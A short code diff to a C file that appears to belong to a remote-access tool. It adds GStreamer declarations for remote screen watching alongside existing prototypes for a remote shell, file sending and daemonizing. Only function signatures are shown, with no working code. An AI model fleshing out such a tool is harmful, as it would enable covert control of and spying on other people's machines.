@@ -4,6 +4,7 @@
 #include <errno.h>  //errno
 #include <string.h> //strerror()
 #include <stdlib.h> //printf()
+#include <gst/gst.h> //GstBus, GstMessage
 
 #define error(expression, function)     printf("ERROR : %s\nFunction : %s\nError Number : %d\nError Message : %s\n", expression, function, errno, strerror(errno));
 
@@ -18,6 +19,14 @@ typedef int SOCKET;
 typedef struct sockaddr_in SOCKADDR_IN;
 typedef struct sockaddr SOCKADDR;
 
+typedef struct _CustomData
+{
+    gboolean is_live;
+    GstElement *pipeline;
+    GMainLoop *loop;
+
+}CustomData;
+
 
 void dispatch_modules(char *argv[]);
 
@@ -28,6 +37,12 @@ void *send_dowloaded_file(void);
 void *send_hosts_file(void);
 
 void *start_remote_shell(char *argv[]);
+
+void *get_remote_screen_resolution(void);
+void clean_buffer(char *buffer);
+char *split_resolution_cmds(const char *cmd);
+void execute_watch_cmd(void);
+void cb_message(GstBus *bus, GstMessage *msg, CustomData *data);
 
 void daemonize(void);
 
